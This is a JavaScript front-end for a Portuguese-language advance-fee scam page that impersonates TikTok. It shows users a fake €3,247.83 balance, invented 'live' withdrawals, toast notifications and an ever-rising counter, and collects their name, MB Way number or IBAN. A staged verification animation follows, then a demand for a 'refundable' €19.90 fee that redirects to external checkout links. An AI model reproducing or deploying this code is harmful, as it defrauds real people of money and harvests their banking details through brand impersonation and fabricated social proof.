/**
 * Page navigation and rendering
 */

// Pages content
const pages = {
  withdraw: `
    <div class="withdraw-page">
      <div class="page-header">
        <button class="back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
        </button>
        <h1>Resgatar recompensas</h1>
        <button class="help-btn">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
        </button>
      </div>
      
      <!-- Card de Saldo -->
      <div class="balance-card">
        <div class="balance-title">O teu saldo</div>
        <div class="balance-amount-wrapper">
          <div class="balance-amount">€3.247,83</div>
          
        </div>
        <div class="balance-status">
          <span class="balance-status-dot"></span>
          Disponível para levantamento
        </div>
      </div>

      <div class="last-rewards">
        <span class="last-rewards-pulse"></span>
        Últimas recompensas: €187,43
      </div>

      <!-- Social Proof -->
      <div class="social-proof-bar">
        <div class="social-proof-live-dot"></div>
        <span class="social-proof-text"><strong id="online-count">853</strong> pessoas levantaram dinheiro hoje</span>
      </div>

      <!-- Seção Branca Principal -->
      <div class="withdraw-content">
        <h2 class="withdraw-title">Levantar dinheiro</h2>

        <!-- Métodos de Pagamento -->
        <div class="payment-methods-row">
          <div class="payment-method-item">
            <img src="images/mbway-logo.png" alt="MB Way" class="payment-method-logo">
            <span class="payment-method-name">MB Way</span>
          </div>
          <span class="payment-method-separator">/</span>
          <div class="payment-method-item">
            <img src="images/iban-logo.png" alt="IBAN" class="payment-method-logo">
            <span class="payment-method-name">IBAN</span>
          </div>
        </div>

        <!-- Botões de Valor -->
        <div class="amount-options amount-options-top">
          <button class="amount-btn" data-amount="1.50">€1,50</button>
          <button class="amount-btn" data-amount="5">€5</button>
          <button class="amount-btn" data-amount="10">€10</button>
        </div>
        <button class="amount-btn amount-btn-full selected" data-amount="3247.83">
          <span class="amount-btn-full-label">Levantar tudo</span>
          <span class="amount-btn-full-value">€3.247,83</span>
        </button>

        <!-- Display do Método Selecionado -->
        <div id="selected-method-display" class="selected-method-display" style="display: none;">
          <div class="method-display-item">
            <span class="method-logo" id="display-method-logo"></span>
            <div>
              <div class="method-name" id="display-method-name"></div>
              <div class="method-subtitle">Recebimento Imediato</div>
            </div>
            <button class="change-method-btn" onclick="openMethodModal()">Alterar</button>
          </div>
        </div>

        <!-- Formulário do Método -->
        <div id="method-form-container" style="display: none;"></div>

        <!-- Botão Adicionar Método -->
        <button class="add-method-btn" id="add-method-btn">Adicionar método de saque</button>

        <!-- Levantamentos Recentes -->
        <div class="recent-withdrawals">
          <div class="recent-withdrawals-title">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>
            Levantamentos recentes
            <span class="recent-withdrawals-live">AO VIVO</span>
          </div>
          <div id="recent-withdrawals-list" class="recent-withdrawals-list">
            <div class="recent-withdrawal-item">
              <div class="withdrawal-avatar" style="background:#7c3aed;">MS</div>
              <div class="withdrawal-info">
                <div class="withdrawal-name">Maria S.</div>
                <div class="withdrawal-time">há 2 min · MB Way</div>
              </div>
              <div class="withdrawal-amount-value">+€347,50</div>
            </div>
            <div class="recent-withdrawal-item">
              <div class="withdrawal-avatar" style="background:#2563eb;">JC</div>
              <div class="withdrawal-info">
                <div class="withdrawal-name">João C.</div>
                <div class="withdrawal-time">há 5 min · MB Way</div>
              </div>
              <div class="withdrawal-amount-value">+€1.283,00</div>
            </div>
            <div class="recent-withdrawal-item">
              <div class="withdrawal-avatar" style="background:#059669;">AF</div>
              <div class="withdrawal-info">
                <div class="withdrawal-name">Ana F.</div>
                <div class="withdrawal-time">há 8 min · IBAN</div>
              </div>
              <div class="withdrawal-amount-value">+€892,75</div>
            </div>
            <div class="recent-withdrawal-item">
              <div class="withdrawal-avatar" style="background:#dc2626;">RP</div>
              <div class="withdrawal-info">
                <div class="withdrawal-name">Ricardo P.</div>
                <div class="withdrawal-time">há 12 min · MB Way</div>
              </div>
              <div class="withdrawal-amount-value">+€2.150,30</div>
            </div>
          </div>
        </div>

        <!-- Estatísticas -->
        <div class="withdraw-stats">
          <div class="stat-item">
            <div class="stat-value">€1.2M+</div>
            <div class="stat-label">Total distribuído</div>
          </div>
          <div class="stat-item">
            <div class="stat-value">24.819</div>
            <div class="stat-label">Utilizadores pagos</div>
          </div>
          <div class="stat-item">
            <div class="stat-value">~2min</div>
            <div class="stat-label">Tempo médio</div>
          </div>
        </div>

        <!-- Segurança -->
        <div class="withdraw-security">
          <div class="security-badge-item">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            <span>SSL Encriptado</span>
          </div>
          <div class="security-badge-item">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
            <span>Verificado</span>
          </div>
          <div class="security-badge-item">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            <span>Protegido</span>
          </div>
        </div>

        <!-- Textos Informativos -->
        <div class="withdraw-info-text">
          <p>Para levantares dinheiro, precisas de um saldo mínimo de €0,40.</p>
          <p>Os limites de levantamento para transacções individuais e mensais podem variar conforme o país ou a região.</p>
        </div>
      </div>

      <!-- Toast Container -->
      <div id="withdraw-toast-container" class="withdraw-toast-container"></div>
    </div>
  `,
  
  loading: `
    <div class="loading-page">
      <div class="loading-content">
        <div class="loading-logo">
          <span style="font-size:20px;font-weight:700;color:#111;">TikTok</span>
        </div>
        <div class="loading-spinner"></div>
        <div class="loading-text" id="loading-status">Validando acesso...</div>
        <div class="loading-progress-bar">
          <div class="loading-progress-fill" id="loading-progress"></div>
        </div>
        <div class="loading-steps">
          <div class="loading-step active" id="step-1">
            <div class="loading-step-icon">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
            </div>
            <span>Verificar identidade</span>
          </div>
          <div class="loading-step" id="step-2">
            <div class="loading-step-icon">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            </div>
            <span>Validar saldo</span>
          </div>
          <div class="loading-step" id="step-3">
            <div class="loading-step-icon">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            </div>
            <span>Preparar dados</span>
          </div>
        </div>
      </div>
    </div>
  `,
  
  registration: `
    <div class="confirmation-container">
      <div class="confirmation-header">
        <div class="confirmation-logo">
          <span style="font-size:20px;font-weight:700;color:#111;">TikTok</span>
        </div>
      </div>

      <!-- Saldo Acumulado -->
      <div class="confirmation-section confirmation-balance">
        <div class="confirmation-balance-title">SALDO DISPONÍVEL</div>
        <div class="confirmation-balance-amount" data-amount-target="3247.83">
          € 3.247,83
        </div>
        <div class="confirmation-balance-subtitle">
          Aguardando confirmação para saque
        </div>
      </div>

      <!-- Taxa de Confirmação -->
      <div class="confirmation-section">
        <div class="confirmation-section-title">
          CONFIRMAÇÃO DE IDENTIDADE
        </div>
        <div class="confirmation-fee-amount">
          € 19.90
          <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
        </div>
        <div class="confirmation-fee-description">
          Taxa obrigatória para liberação do saque no valor de
          <span class="bold">€3.247,83</span>. O valor de
          <span class="bold">€19.90</span> será reembolsado integralmente
          para ti em 1 minuto.
        </div>
      </div>

      <!-- Comprovante -->
      <div class="confirmation-section">
        <div class="confirmation-section-title">DADOS PARA REEMBOLSO</div>
        <div class="confirmation-receipt-grid">
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Nome</div>
            <div class="confirmation-receipt-value" id="confirmation-name"></div>
          </div>
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Data</div>
            <div class="confirmation-receipt-value" id="confirmation-date"></div>
          </div>
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Número MB Way</div>
            <div class="confirmation-receipt-value" id="confirmation-key-type"></div>
          </div>
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Valor a receber</div>
            <div class="confirmation-receipt-value bold">€ 3.247,83</div>
          </div>
        </div>
      </div>

      <div class="confirmation-divider"></div>

      <!-- Requisitos -->
      <div class="confirmation-section">
        <div class="confirmation-section-title">PROCESSO DE LIBERAÇÃO</div>
        <div class="confirmation-requirements-grid">
          <div class="confirmation-requirement-item">
            <div class="confirmation-requirement-icon">1</div>
            <div class="confirmation-requirement-content">
              <div class="confirmation-requirement-title">
                Pagar taxa de confirmação
              </div>
              <div class="confirmation-requirement-description">
                € 19.90 para verificação de identidade
              </div>
            </div>
          </div>
          <div class="confirmation-requirement-item">
            <div class="confirmation-requirement-icon confirmation-reembolso">
              ✓
            </div>
            <div class="confirmation-requirement-content">
              <div class="confirmation-requirement-title confirmation-reembolso">
                Receber reembolso automático
              </div>
              <div class="confirmation-requirement-description">
                Valor devolvido em 1 minuto
              </div>
            </div>
          </div>
          <div class="confirmation-requirement-item">
            <div class="confirmation-requirement-icon">3</div>
            <div class="confirmation-requirement-content">
              <div class="confirmation-requirement-title">
                Acessar saldo completo
              </div>
              <div class="confirmation-requirement-description">
                € 3.247,83 liberado para saque
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- Call to Action -->
      <div class="confirmation-section">
        <a href="#" class="confirmation-cta-button" id="pay-tax-btn">
          Pagar Taxa e libertar levantamento
        </a>
        <div class="confirmation-timer">
          ⏱️ Reembolso automático em 1 minuto
        </div>
        <div class="confirmation-success-message" id="confirmation-success-message">
          ✅ Identidade confirmada. € 19.90 reembolsados e saque liberado.
        </div>
      </div>

      <!-- Footer -->
      <div class="confirmation-footer">
        <div class="confirmation-footer-text">Processo 100% seguro</div>
        <a href="javascript:void(0)" class="confirmation-footer-link">Precisa de ajuda?</a>
      </div>
    </div>
  `,
  
  video: `
  <div class="video-page">
  <div class="video-header">
    ASSISTE AO VÍDEO ABAIXO PARA LIBERARES O TEU LEVANTAMENTO E ACESSO VITALÍCIO.
  </div>
  
  <div class="header-content" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
    <div class="logo-container">
      <span style="font-size:20px;font-weight:700;color:#111;">TikTok</span>
    </div>
    
    <div class="balance-display" style="border: 2px solid #ff2c55; border-radius: 8px; padding: 15px; text-align: center;">
      <div style="font-size: 14px; margin-bottom: 5px;">SALDO</div>
      <div class="balance-amount" style="font-size: 18px; font-weight: bold;">€ 3.247,83</div>
    </div>
  </div>
  
  <div style="border-bottom: 4px solid black; margin-bottom: 20px;"></div>
  
  <h1 style="color: #ff2c55; font-weight: 800; font-family: 'Poppins', sans-serif;">
    DESBLOQUEIO DE SALDO
  </h1>
  <p class="video-instruction">Vê como liberar o teu levantamento assistindo ao vídeo.</p>
  
  <style>
  .video-container {
    border: 2px solid #ff2c55;
    border-radius: 8px;
    overflow: hidden;
    max-width: 100%;
    height: auto;
    margin: 0 auto;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
  }

  .video-container video {
    width: 100%;
    height: auto;
    display: block;
    background-color: #000; /* previne fundo branco durante o carregamento */
    transition: opacity 0.3s ease-in-out;
    border-radius: 8px;
  }
</style>

<div class="video-container">
  <video
    id="tutorial-video"
    controls
    preload="metadata"
    poster="https://charming-figolla-3a3b33.netlify.app/src/media/capatiktok.jpg"
    playsinline
  >
    <source src="https://harmonious-toffee-77df94.netlify.app/video.mp4" type="video/mp4">
    O teu navegador não suporta a reprodução de vídeo.
  </video>
</div>

  
  <button class="unlock-btn">
    DESBLOQUEAR AGORA
  </button>
</div>
  `
};

// Current page state
let currentPage = null;

// Initialize page navigation
function initializePages() {
  const hash = (location.hash || "").replace("#", "");
  if (hash === "withdraw") {
    showPage("withdraw");
  } else if (hash === "registration") {
    showPage("registration");
  } else if (hash === "checkout") {
    // Redirect to standalone checkout page
    window.location.href = 'https://checkout.waylinxpay.com/1776041475474';
  }
}

// Show specific page with smooth transition
function showPage(pageName) {
  const container = document.querySelector('.app-container');

  // Save current content if it's the first navigation
  if (!currentPage) {
    currentPage = container.innerHTML;
  }

  // Redirect checkout to standalone page
  if (pageName === 'checkout') {
    window.location.href = 'https://checkout.waylinxpay.com/1776041475474';
    return;
  }

  // Clean up timers from withdraw page if leaving
  if (typeof clearWithdrawTimers === 'function') clearWithdrawTimers();

  // Fade out current content, then swap
  container.style.transition = 'opacity 0.2s ease';
  container.style.opacity = '0';

  setTimeout(() => {
    container.innerHTML = pages[pageName];

    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'instant' });

    // Fade in new content (animation handled by CSS on child elements)
    container.style.opacity = '1';

    // Add page-specific event listeners
    if (pageName === 'withdraw') {
      setupWithdrawPage();
    } else if (pageName === 'registration') {
      setupRegistrationPage();
    } else if (pageName === 'video') {
      setupVideoPage();
    }
  }, 200);
}

// Setup event listeners for withdraw page
function setupWithdrawPage() {
  // Back button
  const backBtn = document.querySelector('.back-btn');
  if (backBtn) {
    backBtn.addEventListener('click', () => {
      clearWithdrawTimers();
      const container = document.querySelector('.app-container');
      container.innerHTML = currentPage;
      initializePages();
    });
  }

  const balanceImg = document.querySelector('.balance-image');
  if (balanceImg) {
    const customSrc = typeof getUrlParam === 'function' ? getUrlParam('balanceImage') : null;
    if (customSrc) {
      balanceImg.src = customSrc;
    }
  }

  // Click sound via Web Audio API
  function playClickSound() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.frequency.value = 800;
      gain.gain.value = 0.08;
      osc.start();
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.08);
      osc.stop(ctx.currentTime + 0.1);
    } catch (_) {}
  }

  // Notification sound (subtle ding)
  function playNotifSound() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.type = 'sine';
      osc.frequency.value = 880;
      gain.gain.value = 0.04;
      osc.start();
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.15);
      osc.stop(ctx.currentTime + 0.2);
    } catch (_) {}
  }

  // Amount selection with sound
  document.querySelectorAll('.amount-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      playClickSound();
      document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
      btn.classList.add('selected');
    });
  });

  // Botão adicionar método with sound
  const addMethodBtn = document.getElementById('add-method-btn');
  if (addMethodBtn) {
    addMethodBtn.addEventListener('click', () => {
      playClickSound();
      openMethodModal();
    });
  }

  // Fechar modal ao clicar fora
  const methodModal = document.getElementById('method-modal');
  if (methodModal) {
    methodModal.addEventListener('click', (e) => {
      if (e.target === methodModal) closeMethodModal();
    });
  }

  // --- Toast notification system (social proof) ---
  var toastPeople = [
    { name: 'Sofia M.', initials: 'SM', color: '#8b5cf6', amount: '€521,40', method: 'MB Way' },
    { name: 'Pedro L.', initials: 'PL', color: '#3b82f6', amount: '€1.847,90', method: 'MB Way' },
    { name: 'Beatriz R.', initials: 'BR', color: '#ec4899', amount: '€673,25', method: 'IBAN' },
    { name: 'Tiago A.', initials: 'TA', color: '#f59e0b', amount: '€2.390,00', method: 'MB Way' },
    { name: 'Carolina F.', initials: 'CF', color: '#10b981', amount: '€445,80', method: 'IBAN' },
    { name: 'Miguel S.', initials: 'MS', color: '#ef4444', amount: '€1.128,65', method: 'MB Way' },
    { name: 'Inês V.', initials: 'IV', color: '#6366f1', amount: '€987,30', method: 'MB Way' },
    { name: 'Diogo C.', initials: 'DC', color: '#14b8a6', amount: '€3.120,00', method: 'IBAN' }
  ];
  var toastIdx = 0;

  function showWithdrawToast() {
    var container = document.getElementById('withdraw-toast-container');
    if (!container) return;
    var p = toastPeople[toastIdx % toastPeople.length];
    toastIdx++;
    var toast = document.createElement('div');
    toast.className = 'withdraw-toast';
    toast.innerHTML =
      '<div class="toast-avatar" style="background:' + p.color + ';">' + p.initials + '</div>' +
      '<div class="toast-content">' +
        '<div class="toast-text"><strong>' + p.name + '</strong> levantou ' + p.amount + '</div>' +
        '<div class="toast-time">agora mesmo · ' + p.method + '</div>' +
      '</div>';
    container.appendChild(toast);
    playNotifSound();
    setTimeout(function () {
      toast.classList.add('toast-exit');
      setTimeout(function () {
        if (toast.parentNode) toast.parentNode.removeChild(toast);
      }, 400);
    }, 4000);
  }

  // First toast after 3s, then every 8-12s
  window._withdrawToastTimeout = setTimeout(showWithdrawToast, 3000);
  window._withdrawToastInterval = setInterval(function () {
    if (!document.getElementById('withdraw-toast-container')) {
      clearInterval(window._withdrawToastInterval);
      return;
    }
    showWithdrawToast();
  }, 10000);

  // Animate online count — always increment
  var onlineEl = document.getElementById('online-count');
  if (onlineEl) {
    window._withdrawCounterInterval = setInterval(function () {
      if (!document.getElementById('online-count')) {
        clearInterval(window._withdrawCounterInterval);
        return;
      }
      var current = parseInt(onlineEl.textContent) || 853;
      var increase = Math.floor(Math.random() * 3) + 1; // +1 to +3
      onlineEl.textContent = current + increase;
    }, 4000);
  }

  // --- Dynamic recent withdrawals (add new entries) ---
  var dynamicWithdrawals = [
    { name: 'Catarina M.', initials: 'CM', color: '#8b5cf6', amount: '€1.456,20', method: 'MB Way' },
    { name: 'Bruno T.', initials: 'BT', color: '#0891b2', amount: '€723,90', method: 'IBAN' },
    { name: 'Daniela R.', initials: 'DR', color: '#e11d48', amount: '€2.891,00', method: 'MB Way' },
    { name: 'Gonçalo P.', initials: 'GP', color: '#059669', amount: '€458,75', method: 'MB Way' },
    { name: 'Filipa S.', initials: 'FS', color: '#7c3aed', amount: '€1.834,50', method: 'IBAN' },
    { name: 'Rui A.', initials: 'RA', color: '#dc2626', amount: '€3.247,83', method: 'MB Way' },
    { name: 'Leonor V.', initials: 'LV', color: '#2563eb', amount: '€567,30', method: 'MB Way' },
    { name: 'Nuno G.', initials: 'NG', color: '#ca8a04', amount: '€1.123,60', method: 'IBAN' },
    { name: 'Marta C.', initials: 'MC', color: '#db2777', amount: '€2.340,15', method: 'MB Way' },
    { name: 'André L.', initials: 'AL', color: '#4f46e5', amount: '€895,40', method: 'MB Way' },
    { name: 'Sara B.', initials: 'SB', color: '#0d9488', amount: '€1.678,00', method: 'IBAN' },
    { name: 'Tiago F.', initials: 'TF', color: '#b91c1c', amount: '€3.100,25', method: 'MB Way' }
  ];
  var dynIdx = 0;

  function addDynamicWithdrawal() {
    var list = document.getElementById('recent-withdrawals-list');
    if (!list) return;
    var p = dynamicWithdrawals[dynIdx % dynamicWithdrawals.length];
    dynIdx++;
    var item = document.createElement('div');
    item.className = 'recent-withdrawal-item withdrawal-new';
    item.innerHTML =
      '<div class="withdrawal-avatar" style="background:' + p.color + ';">' + p.initials + '</div>' +
      '<div class="withdrawal-info">' +
        '<div class="withdrawal-name">' + p.name + '</div>' +
        '<div class="withdrawal-time">agora mesmo · ' + p.method + '</div>' +
      '</div>' +
      '<div class="withdrawal-amount-value">+' + p.amount + '</div>';
    list.insertBefore(item, list.firstChild);
    playNotifSound();
    // Keep max 8 visible
    while (list.children.length > 8) {
      list.removeChild(list.lastChild);
    }
  }

  window._withdrawDynTimeout = setTimeout(function() {
    addDynamicWithdrawal();
    window._withdrawDynInterval = setInterval(function () {
      if (!document.getElementById('recent-withdrawals-list')) {
        clearInterval(window._withdrawDynInterval);
        return;
      }
      addDynamicWithdrawal();
    }, 8000);
  }, 5000);
}

// Clean up withdraw page timers
function clearWithdrawTimers() {
  if (window._withdrawToastTimeout) clearTimeout(window._withdrawToastTimeout);
  if (window._withdrawToastInterval) clearInterval(window._withdrawToastInterval);
  if (window._withdrawCounterInterval) clearInterval(window._withdrawCounterInterval);
  if (window._withdrawDynTimeout) clearTimeout(window._withdrawDynTimeout);
  if (window._withdrawDynInterval) clearInterval(window._withdrawDynInterval);
}

// Setup event listeners for registration page
function setupRegistrationPage() {
  // Preencher dados de reembolso
  let formData = window.withdrawalFormData || {};
  // Tentar ler do localStorage caso nao exista em memoria
  if (!formData.name && !formData.number) {
    try {
      const stored = JSON.parse(localStorage.getItem('withdrawalFormData') || '{}');
      if (stored.name) formData = stored;
    } catch(_) {}
  }

  const nameEl = document.getElementById('confirmation-name');
  if (nameEl) nameEl.textContent = formData.name || 'Utilizador';

  const mbwayEl = document.getElementById('confirmation-key-type');
  if (mbwayEl) {
    if (formData.number) {
      mbwayEl.textContent = '+351 ' + formData.number;
    } else if (formData.iban) {
      mbwayEl.textContent = formData.iban;
    } else {
      mbwayEl.textContent = 'Pendente';
    }
  }

  // Preencher data atual
  const dateEl = document.getElementById('confirmation-date');
  if (dateEl) {
    const now = new Date();
    const day = String(now.getDate()).padStart(2, '0');
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const year = now.getFullYear();
    dateEl.textContent = `${day}/${month}/${year}`;
  }
  
  const payButton = document.getElementById('pay-tax-btn');
  
  if (payButton) {
    payButton.addEventListener('click', (e) => {
      e.preventDefault();
      // Rastrear InitiateCheckout quando clica em "Pagar Taxa"
      if (typeof trackInitiateCheckout === 'function') {
        trackInitiateCheckout(19.90);
      }
      window.location.href = 'https://checkout.waylinxpay.com/1776041475474';
    });
  }
}

// Setup event listeners for video page
function setupVideoPage() {
  document.querySelector('.unlock-btn').addEventListener('click', () => {
    window.location.href = 'https://go.pepperpay.com.br/04yi8';
  });
}

// Métodos de saque - funções globais
let selectedPaymentMethod = null;

function openMethodModal() {
  const modal = document.getElementById('method-modal');
  if (modal) {
    modal.style.display = 'flex';
  }
}

function closeMethodModal() {
  const modal = document.getElementById('method-modal');
  if (modal) {
    modal.style.display = 'none';
  }
}

function selectMethod(method) {
  selectedPaymentMethod = method;
  closeMethodModal();
  renderMethodForm(method);
  updateMethodDisplay(method);
}

function renderMethodForm(method) {
  const container = document.getElementById('method-form-container');
  const addBtn = document.getElementById('add-method-btn');
  
  if (!container) return;
  
  let formHTML = '';
  
  if (method === 'mbway') {
    formHTML = `
      <div class="method-form">
        <h3>Ligar Método de Recebimento</h3>
        <div class="form-group">
          <label>Nome</label>
          <input type="text" class="form-input" placeholder="Nome completo" id="mbway-name">
        </div>
        <div class="form-group">
          <label>Número MBWay</label>
          <div class="phone-input-wrapper">
            <div class="country-code">
              <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Flag_of_Portugal.svg/1280px-Flag_of_Portugal.svg.png" alt="PT">
              <span class="code">+351</span>
            </div>
            <input type="tel" class="form-input phone-input" placeholder="Introduza o seu número MBWay" id="mbway-number" pattern="[0-9]*" inputmode="numeric" maxlength="9">
          </div>
        </div>
        <button class="form-submit-btn" onclick="submitMethodForm()">Enviar</button>
      </div>
    `;
  } else if (method === 'iban') {
    formHTML = `
      <div class="method-form">
        <h3>Ligar Método de Recebimento</h3>
        <div class="form-group">
          <label>Nome completo do titular da conta</label>
          <input type="text" class="form-input" placeholder="Exatamente como está no banco" id="iban-name">
        </div>
        <div class="form-group">
          <label>IBAN</label>
          <input type="text" class="form-input" placeholder="Começa sempre com PT50" id="iban-number" pattern="[A-Z0-9]*" inputmode="text" maxlength="34">
        </div>
        <div class="form-group">
          <label>Banco</label>
          <input type="text" class="form-input" placeholder="Nome do banco" id="iban-bank">
        </div>
        <button class="form-submit-btn" onclick="submitMethodForm()">Enviar</button>
      </div>
    `;
  }
  
  container.innerHTML = formHTML;
  container.style.display = 'block';
  if (addBtn) addBtn.style.display = 'none';
  
  // Adicionar validação para aceitar apenas números
  if (method === 'mbway') {
    const mbwayInput = document.getElementById('mbway-number');
    if (mbwayInput) {
      mbwayInput.addEventListener('input', function(e) {
        // Remove tudo que não é número
        e.target.value = e.target.value.replace(/\D/g, '');
      });
      mbwayInput.addEventListener('keypress', function(e) {
        // Permite apenas números
        if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
          e.preventDefault();
        }
      });
    }
  } else if (method === 'iban') {
    const ibanInput = document.getElementById('iban-number');
    if (ibanInput) {
      ibanInput.addEventListener('input', function(e) {
        // Remove espaços e converte para maiúsculas, permite apenas letras e números
        let value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
        e.target.value = value;
      });
    }
  }
}

function updateMethodDisplay(method) {
  const display = document.getElementById('selected-method-display');
  const logo = document.getElementById('display-method-logo');
  const name = document.getElementById('display-method-name');
  
  if (!display || !logo || !name) return;
  
  if (method === 'mbway') {
    logo.innerHTML = '<img src="images/mbway-logo.png" alt="MB Way" style="width: 50px; height: 35px; object-fit: contain;">';
    name.textContent = 'MB Way';
  } else if (method === 'iban') {
    logo.innerHTML = '<img src="images/iban-logo.png" alt="IBAN" style="width: 50px; height: 35px; object-fit: contain;">';
    name.textContent = 'IBAN';
  }
  
  display.style.display = 'block';
}

function submitMethodForm() {
  // Validar e processar formulário
  let formData = {};
  
  if (selectedPaymentMethod === 'mbway') {
    const name = document.getElementById('mbway-name')?.value;
    const number = document.getElementById('mbway-number')?.value;
    if (!name || !number) {
      alert('Por favor, preenche todos os campos');
      return;
    }
    if (!/^\d+$/.test(number)) {
      alert('O número MBWay deve conter apenas números');
      return;
    }
    if (number.length !== 9) {
      alert('O número MBWay deve ter 9 dígitos');
      return;
    }
    formData = { name, number, method: 'mbway' };
  } else if (selectedPaymentMethod === 'iban') {
    const name = document.getElementById('iban-name')?.value;
    const iban = document.getElementById('iban-number')?.value;
    const bank = document.getElementById('iban-bank')?.value;
    if (!name || !iban || !bank) {
      alert('Por favor, preenche todos os campos');
      return;
    }
    var ibanClean = iban.toUpperCase().replace(/\s/g, '');
    if (!ibanClean.startsWith('PT')) {
      alert('O IBAN deve começar com PT');
      return;
    }
    if (ibanClean.length < 25) {
      alert('O IBAN português deve ter 25 caracteres (ex: PT50 0000 0000 0000 0000 0001 4)');
      return;
    }
    formData = { name, iban: ibanClean, bank, method: 'iban' };
  }
  
  // Salvar dados do formulário para usar na página de registro e checkout
  window.withdrawalFormData = formData;
  try { localStorage.setItem('withdrawalFormData', JSON.stringify(formData)); } catch(_) {}

  // Mostrar tela de loading com progresso animado
  showPage('loading');

  // Animar steps do loading
  var loadingSteps = [
    { id: 'step-1', text: 'Verificando identidade...', progress: 33 },
    { id: 'step-2', text: 'Validando saldo...', progress: 66 },
    { id: 'step-3', text: 'Preparando dados...', progress: 100 }
  ];

  function animateLoadingStep(index) {
    if (index >= loadingSteps.length) {
      setTimeout(function() { showPage('registration'); }, 400);
      return;
    }
    var step = loadingSteps[index];
    var statusEl = document.getElementById('loading-status');
    var progressEl = document.getElementById('loading-progress');
    var stepEl = document.getElementById(step.id);

    if (statusEl) statusEl.textContent = step.text;
    if (progressEl) progressEl.style.width = step.progress + '%';

    // Mark previous steps as done
    for (var i = 0; i < index; i++) {
      var prev = document.getElementById(loadingSteps[i].id);
      if (prev) { prev.classList.remove('active'); prev.classList.add('done'); }
    }
    if (stepEl) { stepEl.classList.add('active'); stepEl.classList.remove('done'); }

    setTimeout(function() { animateLoadingStep(index + 1); }, 800);
  }

  setTimeout(function() { animateLoadingStep(0); }, 300);
}

// Tornar funções disponíveis globalmente
window.openMethodModal = openMethodModal;
window.closeMethodModal = closeMethodModal;
window.selectMethod = selectMethod;
window.submitMethodForm = submitMethodForm;
